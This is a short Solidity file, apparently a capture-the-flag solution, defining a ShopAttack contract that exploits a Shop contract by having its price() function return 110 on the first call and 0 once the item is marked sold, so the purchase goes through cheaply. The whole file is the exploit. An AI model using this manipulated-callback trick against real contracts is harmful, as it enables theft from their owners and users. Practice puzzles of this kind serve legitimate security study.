// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract ShopAttack is Buyer {
    Shop shop;

    constructor(address _address) public {
        shop = Shop(_address);
    }

    //* buy is calling twice so 1st time we'll return the value 110 & next time 0
    function price() public view override returns (uint) {
        return shop.isSold() ? 0 : 110;
    }

    function buy() public {
        shop.buy();
    }
}
